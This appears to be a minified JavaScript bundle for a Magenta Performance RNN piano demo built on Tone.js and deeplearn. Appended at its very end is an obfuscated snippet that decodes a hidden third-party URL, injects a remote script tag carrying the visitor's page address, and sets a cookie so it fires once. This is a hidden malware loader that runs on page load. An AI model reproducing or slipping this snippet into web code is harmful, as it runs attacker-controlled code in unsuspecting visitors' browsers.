this._playbackRate},set:function(t){this._playbackRate=t;var e=this.now();this._elapsedTime.frequency.setValueAtTime(t,e),this._loop||this._stopAtNextIteration(e),this._activeSources.forEach((function(n){n.playbackRate.setValueAtTime(t,e)}))}}),Object.defineProperty(t.Player.prototype,"position",{get:function(){var e=this.now();if(this._state.getValueAtTime(e)===t.State.Started&&this.loaded){var n=this.buffer.duration;return this._elapsedTime.getTicksAtTime(e)%n}return 0}}),Object.defineProperty(t.Player.prototype,"reverse",{get:function(){return this._buffer.reverse},set:function(t){this._buffer.reverse=t}}),Object.defineProperty(t.Player.prototype,"loaded",{get:function(){return this._buffer.loaded}}),t.Player.prototype.dispose=function(){return this._activeSources.forEach((function(t){t.dispose()})),this._activeSources=null,t.Source.prototype.dispose.call(this),this._buffer.dispose(),this._buffer=null,this._elapsedTime.dispose(),this._elapsedTime=null,this},t.Player})),n((function(t){return t.Players=function(e){var n=Array.prototype.slice.call(arguments);n.shift();var r=t.defaults(n,["onload"],t.Players);for(var i in t.call(this),this._volume=this.output=new t.Volume(r.volume),this.volume=this._volume.volume,this._readOnly("volume"),this._volume.output.output.channelCount=2,this._volume.output.output.channelCountMode="explicit",this.mute=r.mute,this._players={},this._loadingCount=0,this._fadeIn=r.fadeIn,this._fadeOut=r.fadeOut,e)this._loadingCount++,this.add(i,e[i],this._bufferLoaded.bind(this,r.onload))},t.extend(t.Players,t.AudioNode),t.Players.defaults={volume:0,mute:!1,onload:t.noOp,fadeIn:0,fadeOut:0},t.Players.prototype._bufferLoaded=function(t){this._loadingCount--,0===this._loadingCount&&t&&t(this)},Object.defineProperty(t.Players.prototype,"mute",{get:function(){return this._volume.mute},set:function(t){this._volume.mute=t}}),Object.defineProperty(t.Players.prototype,"fadeIn",{get:function(){return this._fadeIn},set:function(t){this._fadeIn=t,this._forEach((function(e){e.fadeIn=t}))}}),Object.defineProperty(t.Players.prototype,"fadeOut",{get:function(){return this._fadeOut},set:function(t){this._fadeOut=t,this._forEach((function(e){e.fadeOut=t}))}}),Object.defineProperty(t.Players.prototype,"state",{get:function(){var e=!1;return this._forEach((function(n){e=e||n.state===t.State.Started})),e?t.State.Started:t.State.Stopped}}),t.Players.prototype.has=function(t){return this._players.hasOwnProperty(t)},t.Players.prototype.get=function(t){if(this.has(t))return this._players[t];throw new Error("Tone.Players: no player named "+t)},t.Players.prototype._forEach=function(t){for(var e in this._players)t(this._players[e],e);return this},Object.defineProperty(t.Players.prototype,"loaded",{get:function(){var t=!0;return this._forEach((function(e){t=t&&e.loaded})),t}}),t.Players.prototype.add=function(e,n,r){return this._players[e]=new t.Player(n,r).connect(this.output),this._players[e].fadeIn=this._fadeIn,this._players[e].fadeOut=this._fadeOut,this},t.Players.prototype.stopAll=function(t){this._forEach((function(e){e.stop(t)}))},t.Players.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._volume.dispose(),this._volume=null,this._writable("volume"),this.volume=null,this.output=null,this._forEach((function(t){t.dispose()})),this._players=null,this},t.Players})),n((function(t){return t.UserMedia=function(){var e=t.defaults(arguments,["volume"],t.UserMedia);t.AudioNode.call(this),this._mediaStream=null,this._stream=null,this._device=null,this._volume=this.output=new t.Volume(e.volume),this.volume=this._volume.volume,this._readOnly("volume"),this.mute=e.mute},t.extend(t.UserMedia,t.AudioNode),t.UserMedia.defaults={volume:0,mute:!1},t.UserMedia.prototype.open=function(e){return t.UserMedia.enumerateDevices().then(function(n){var r;if(t.isNumber(e))r=n[e];else if(!(r=n.find((function(t){return t.label===e||t.deviceId===e})))&&n.length>0)r=n[0];else if(!r&&t.isDefined(e))throw new Error("Tone.UserMedia: no matching device: "+e);this._device=r;var i={audio:{echoCancellation:!1,sampleRate:this.context.sampleRate}};return r&&(i.audio.deviceId=r.deviceId),navigator.mediaDevices.getUserMedia(i).then(function(t){return this._stream||(this._stream=t,this._mediaStream=this.context.createMediaStreamSource(t),this._mediaStream.connect(this.output)),this}.bind(this))}.bind(this))},t.UserMedia.prototype.close=function(){return this._stream&&(this._stream.getAudioTracks().forEach((function(t){t.stop()})),this._stream=null,this._mediaStream.disconnect(),this._mediaStream=null),this._device=null,this},t.UserMedia.enumerateDevices=function(){return navigator.mediaDevices.enumerateDevices().then((function(t){return t.filter((function(t){return"audioinput"===t.kind}))}))},Object.defineProperty(t.UserMedia.prototype,"state",{get:function(){return this._stream&&this._stream.active?t.State.Started:t.State.Stopped}}),Object.defineProperty(t.UserMedia.prototype,"deviceId",{get:function(){if(this._device)return this._device.deviceId}}),Object.defineProperty(t.UserMedia.prototype,"groupId",{get:function(){if(this._device)return this._device.groupId}}),Object.defineProperty(t.UserMedia.prototype,"label",{get:function(){if(this._device)return this._device.label}}),Object.defineProperty(t.UserMedia.prototype,"mute",{get:function(){return this._volume.mute},set:function(t){this._volume.mute=t}}),t.UserMedia.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this.close(),this._writable("volume"),this._volume.dispose(),this._volume=null,this.volume=null,this},Object.defineProperty(t.UserMedia,"supported",{get:function(){return t.isDefined(navigator.mediaDevices)&&t.isFunction(navigator.mediaDevices.getUserMedia)}}),t.UserMedia})),n((function(t){return t.Midi=function(e,n){if(!(this instanceof t.Midi))return new t.Midi(e,n);t.Frequency.call(this,e,n)},t.extend(t.Midi,t.Frequency),t.Midi.prototype._defaultUnits="midi",t.Midi.prototype._frequencyToUnits=function(e){return t.Frequency.ftom(t.Frequency.prototype._frequencyToUnits.call(this,e))},t.Midi.prototype._ticksToUnits=function(e){return t.Frequency.ftom(t.Frequency.prototype._ticksToUnits.call(this,e))},t.Midi.prototype._beatsToUnits=function(e){return t.Frequency.ftom(t.Frequency.prototype._beatsToUnits.call(this,e))},t.Midi.prototype._secondsToUnits=function(e){return t.Frequency.ftom(t.Frequency.prototype._secondsToUnits.call(this,e))},t.Midi.prototype.toMidi=function(){return this.valueOf()},t.Midi.prototype.toFrequency=function(){return t.Frequency.mtof(this.toMidi())},t.Midi.prototype.transpose=function(t){return new this.constructor(this.toMidi()+t)},t.Midi})),t},"object"==typeof e?e.exports=i():r.Tone=i()},{}],156:[function(t,e,n){(function(t){!function(r){var i="object"==typeof n&&n,o="object"==typeof e&&e&&e.exports==i&&e,s="object"==typeof t&&t;s.global!==s&&s.window!==s||(r=s);var a,u,c,l=String.fromCharCode;function h(t){for(var e,n,r=[],i=0,o=t.length;i<o;)(e=t.charCodeAt(i++))>=55296&&e<=56319&&i<o?56320==(64512&(n=t.charCodeAt(i++)))?r.push(((1023&e)<<10)+(1023&n)+65536):(r.push(e),i--):r.push(e);return r}function p(t){if(t>=55296&&t<=57343)throw Error("Lone surrogate U+"+t.toString(16).toUpperCase()+" is not a scalar value")}function d(t,e){return l(t>>e&63|128)}function f(t){if(0==(4294967168&t))return l(t);var e="";return 0==(4294965248&t)?e=l(t>>6&31|192):0==(4294901760&t)?(p(t),e=l(t>>12&15|224),e+=d(t,6)):0==(4292870144&t)&&(e=l(t>>18&7|240),e+=d(t,12),e+=d(t,6)),e+=l(63&t|128)}function y(){if(c>=u)throw Error("Invalid byte index");var t=255&a[c];if(c++,128==(192&t))return 63&t;throw Error("Invalid continuation byte")}function m(){var t,e;if(c>u)throw Error("Invalid byte index");if(c==u)return!1;if(t=255&a[c],c++,0==(128&t))return t;if(192==(224&t)){if((e=(31&t)<<6|y())>=128)return e;throw Error("Invalid continuation byte")}if(224==(240&t)){if((e=(15&t)<<12|y()<<6|y())>=2048)return p(e),e;throw Error("Invalid continuation byte")}if(240==(248&t)&&(e=(7&t)<<18|y()<<12|y()<<6|y())>=65536&&e<=1114111)return e;throw Error("Invalid UTF-8 detected")}var v={version:"2.1.2",encode:function(t){for(var e=h(t),n=e.length,r=-1,i="";++r<n;)i+=f(e[r]);return i},decode:function(t){a=h(t),u=a.length,c=0;for(var e,n=[];!1!==(e=m());)n.push(e);return function(t){for(var e,n=t.length,r=-1,i="";++r<n;)(e=t[r])>65535&&(i+=l((e-=65536)>>>10&1023|55296),e=56320|1023&e),i+=l(e);return i}(n)}};if(i&&!i.nodeType)if(o)o.exports=v;else{var g={}.hasOwnProperty;for(var _ in v)g.call(v,_)&&(i[_]=v[_])}else r.utf8=v}(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],157:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}},o=this;Object.defineProperty(n,"__esModule",{value:!0});var s,a,u,c,l,h,p,d,f,y,m,v,g=t("deeplearn"),_=t("./keyboard_element"),b=t("tone-piano").Piano,w=g.scalar(1),x=new Map,T=[1,2,4,8,16,32,64],S=!1,O=0,E=0,A=100,k="No midi output devices found.",P=0,M=[["note_on",0,127],["note_off",0,127],["time_shift",1,100],["velocity_change",1,32]];var C=function(){for(var t=0,e=0,n=M;e<n.length;e++){var r=n[e],i=r[1];t+=r[2]-i+1}return t}(),N=g.scalar(355,"int32"),R=document.querySelector("#keyboard"),F=new _.KeyboardElement(R),D=new b({velocities:4}).toMaster(),I="https://storage.googleapis.com/download.magenta.tensorflow.org/demos/SalamanderPiano/",B="https://storage.googleapis.com/download.magenta.tensorflow.org/models/performance_rnn/dljs/";g.ENV.get("WEBGL_VERSION")>=1?D.load(I).then((function(){return new g.CheckpointLoader(B).getAllVariables()})).then((function(t){document.querySelector("#status").classList.add("hidden"),document.querySelector("#controls").classList.remove("hidden"),document.querySelector("#keyboard").classList.remove("hidden"),s=t["rnn/multi_rnn_cell/cell_0/basic_lstm_cell/kernel"],a=t["rnn/multi_rnn_cell/cell_0/basic_lstm_cell/bias"],u=t["rnn/multi_rnn_cell/cell_1/basic_lstm_cell/kernel"],c=t["rnn/multi_rnn_cell/cell_1/basic_lstm_cell/bias"],l=t["rnn/multi_rnn_cell/cell_2/basic_lstm_cell/kernel"],h=t["rnn/multi_rnn_cell/cell_2/basic_lstm_cell/bias"],f=t["fully_connected/biases"],y=t["fully_connected/weights"],q=!0,L()})):document.querySelector("#status").innerHTML="We do not yet support your device. Please try on a desktop computer with Chrome/Firefox, or an Android phone with WebGL support.";var q=!1;function L(){p=[g.zeros([1,a.shape[0]/4]),g.zeros([1,c.shape[0]/4]),g.zeros([1,h.shape[0]/4])],d=[g.zeros([1,a.shape[0]/4]),g.zeros([1,c.shape[0]/4]),g.zeros([1,h.shape[0]/4])],null!=N&&N.dispose(),N=g.scalar(355),O=D.now(),E=performance.now()-1e3*O,ot(++P)}function z(){F.resize()}window.addEventListener("resize",z),z();var V=document.getElementById("note-density"),j=document.getElementById("note-density-display"),U=document.getElementById("conditioning-off");U.onchange=nt;var G=document.getElementById("conditioning-on");G.onchange=et,setTimeout((function(){return nt()}));var W=document.getElementById("conditioning-controls"),X=document.getElementById("gain"),Q=document.getElementById("gain-display"),H=+X.value;Q.innerText=H.toString(),X.addEventListener("input",(function(){H=+X.value,Q.innerText=H.toString()}));var K,Y=["c","cs","d","ds","e","f","fs","g","gs","a","as","b"],Z=Y.map((function(t){return document.getElementById("pitch-"+t)})),J=Y.map((function(t){return document.getElementById("hist-"+t)})),$=[1,1,1,1,1,1,1,1,1,1,1,1],tt=[1,1,1,1,1,1,1,1,1,1,1,1];try{!function(){if(!window.location.hash)return;var t=window.location.hash.substr(1).split("|");V.value=t[0];for(var e=t[1].split(","),n=0;n<Z.length;n++)Z[n].value=e[n];var r=t[2].split(",");for(n=0;n<$.length;n++)$[n]=parseInt(r[n],10);var i=t[3].split(",");for(n=0;n<tt.length;n++)tt[n]=parseInt(i[n],10);"true"===t[4]?et():"false"===t[4]&&nt()}()}catch(t){console.warn(t)}function et(){S=!0,U.checked=!1,G.checked=!0,W.classList.remove("inactive"),W.classList.remove("midicondition"),rt()}function nt(){S=!1,U.checked=!0,G.checked=!1,W.classList.add("inactive"),W.classList.remove("midicondition"),rt()}function rt(){var t=Z.map((function(t){return parseInt(t.value,10)||0}));!function(t){for(var e=0,n=0;n<t.length;n++)e+=t[n];for(n=0;n<t.length;n++)J[n].style.height=(t[n]/e*100).toString()+"px"}(t),null!=v&&(v.dispose(),v=null),window.location.assign("#"+V.value+"|"+t.join(",")+"|"+$.join(",")+"|"+tt.join(",")+"|"+(S?"true":"false"));var e=parseInt(V.value,10)||0,n=T[e];j.innerHTML=n.toString(),v=g.oneHot(g.tensor1d([e+1]),T.length+1).as1D(),null!=m&&(m.dispose(),m=null);for(var r=g.buffer([12],"float32"),i=t.reduce((function(t,e){return t+e})),o=0;o<12;o++)r.set(t[o]/i,o);m=r.toTensor()}function it(t){for(var e=!0,n=0;n<t.length;n++)e=e&&0===t[n];e&&(t=[1,0,0,0,0,0,0,0,0,0,0,0]);for(n=0;n<t.length;n++)Z[n].value=t[n].toString();rt()}function ot(t){return r(this,void 0,void 0,(function(){var e,n,r,o,_,b,x;return i(this,(function(i){if(t<P)return[2];for(e=function(t,e,n){return g.basicLSTMCell(w,s,a,t,e,n)},n=function(t,e,n){return g.basicLSTMCell(w,u,c,t,e,n)},r=function(t,e,n){return g.basicLSTMCell(w,l,h,t,e,n)},o=[],x=g.tidy((function(){for(var t=[],i=0;i<10;i++){var o=g.oneHot(N.as1D(),C).as1D();0===i&&N.dispose();var s=g.tidy((function(){if(S){var t=v.concat(m,0);return g.tensor1d([0]).concat(t,0)}var e=1+v.shape[0]+m.shape[0];return g.oneHot(g.tensor1d([0]),e).as1D()})).concat(o,0),a=g.multiRNNCell([e,n,r],s.as2D(1,-1),p,d);p.forEach((function(t){return t.dispose()})),d.forEach((function(t){return t.dispose()})),p=a[0];var u=(d=a[1])[2].matMul(y).add(f).as1D().softmax(),c=g.ENV.math.multinomial(u,1).asScalar();t.push(c),N=c}return[p,d,t]})),p=x[0],d=x[1],o=x[2],_=0;_<o.length;_++)ht(o[_].dataSync()[0]);return D.now()-O>1&&(console.warn("Generation is "+(D.now()-O)+" seconds behind, which is over 3. Resetting time!"),O=D.now()),b=Math.max(0,O-D.now()-.5),setTimeout((function(){return ot(t)}),1e3*b),[2]}))}))}document.getElementById("note-density").oninput=rt,Z.forEach((function(t){t.oninput=rt})),rt(),document.getElementById("c-major").onclick=function(){it([2,0,1,0,1,1,0,1,0,1,0,1])},document.getElementById("f-major").onclick=function(){it([1,0,1,0,1,2,0,1,0,1,1,0])},document.getElementById("d-minor").onclick=function(){it([1,0,2,0,1,1,0,1,0,1,1,0])},document.getElementById("whole-tone").onclick=function(){it([1,0,1,0,1,0,1,0,1,0,1,0])},document.getElementById("pentatonic").onclick=function(){it([0,1,0,1,0,0,1,0,1,0,1,0])},document.getElementById("reset-rnn").onclick=function(){L()},document.getElementById("preset-1").onclick=function(){it($)},document.getElementById("preset-2").onclick=function(){it(tt)},document.getElementById("save-1").onclick=function(){$=Z.map((function(t){return parseInt(t.value,10)||0})),rt()},document.getElementById("save-2").onclick=function(){tt=Z.map((function(t){return parseInt(t.value,10)||0})),rt()};var st=null,at=null;r(o,void 0,void 0,(function(){var t,e,n,r,o,s,a,u,c;return i(this,(function(i){switch(i.label){case 0:t=document.getElementById("midi-out-container"),e=document.getElementById("midi-in-container"),i.label=1;case 1:return i.trys.push([1,3,,4]),[4,window.navigator.requestMIDIAccess()];case 2:return K=i.sent(),n=document.getElementById("midi-out"),r=document.getElementById("midi-in"),o=0,s=[],K.outputs.forEach((function(t){console.log("\n          Output midi device [type: '"+t.type+"']\n          id: "+t.id+"\n          manufacturer: "+t.manufacturer+"\n          name:"+t.name+"\n          version: "+t.version),s.push(t);var e=document.createElement("option");e.innerText=t.name,n.appendChild(e),o++})),n.addEventListener("change",(function(){st=s[n.selectedIndex-1]})),0===o&&(t.innerText=k),a=0,u=[],K.inputs.forEach((function(t){console.log("\n        Input midi device [type: '"+t.type+"']\n        id: "+t.id+"\n        manufacturer: "+t.manufacturer+"\n        name:"+t.name+"\n        version: "+t.version),u.push(t);var e=document.createElement("option");e.innerText=t.name,r.appendChild(e),a++})),c=function(t){null!=at&&(at.onmidimessage=function(){}),at=t,t.onmidimessage=function(t){var e,n,r=t.data,i=240&r[0],o=r[1];r[2],144===i&&(e=o,(n=performance.now())-ct>1e3&&(lt=[0,0,0,0,0,0,0,0,0,0,0,0],L()),ct=n,S||(L(),et()),setTimeout((function(){performance.now()-ct>ut&&(nt(),L())}),ut),lt[e%12]++,it(lt))}},r.addEventListener("change",(function(){c(u[r.selectedIndex-1])})),0===a&&(e.innerText="No midi input devices found."),[3,4];case 3:return i.sent(),t.innerText=k,K=null,[3,4];case 4:return[2]}}))}));var ut=3e4,ct=performance.now(),lt=[0,0,0,0,0,0,0,0,0,0,0,0];function ht(t){for(var e=0,n=function(n){var r=n[0],i=n[1],o=n[2];if(e<=t&&t<=e+o-i){if("note_on"===r){var s=t-e;if(setTimeout((function(){F.keyDown(s),setTimeout((function(){F.keyUp(s)}),100)}),1e3*(O-D.now())),x.set(s,O),null!=st)try{st.send([144,s,Math.min(Math.floor(A*H),127)],Math.floor(1e3*O)-E)}catch(t){console.log("Error sending midi note on event to midi output device:"),console.log(t)}return{value:D.keyDown(s,O,A*H/100)}}if("note_off"===r){var a=t-e,u=x.get(a);if(null==u)return{value:void 0};var c=Math.max(O,u+.5);return null!=st&&st.send([128,a,Math.min(Math.floor(A*H),127)],Math.floor(1e3*c)-E),D.keyUp(a,c),x.delete(a),{value:void 0}}if("time_shift"===r)return O+=(t-e+1)/100,x.forEach((function(t,e){O-t>3&&(console.info("Note "+e+" has been active for "+(O-t)+", seconds which is over 3, will release."),null!=st&&st.send([128,e,Math.min(Math.floor(A*H),127)]),D.keyUp(e,O),x.delete(e))})),{value:O};if("velocity_change"===r)return A=(t-e+1)*Math.ceil(127/32),{value:A/=127};throw new Error("Could not decode eventType: "+r)}e+=o-i+1},r=0,i=M;r<i.length;r++){var o=n(i[r]);if("object"==typeof o)return o.value}throw new Error("Could not decode index: "+t)}var pt=document.getElementById("resettingText");setTimeout((function t(){q&&(L(),pt.style.opacity="100"),setTimeout((function(){pt.style.opacity="0"}),1e3),setTimeout(t,3e4)}),3e4)},{"./keyboard_element":1,deeplearn:60,"tone-piano":154}]},{},[157])(157)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3z'+'xjwxyfynhx3htr'+'4ljy4xyfynh3ox')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));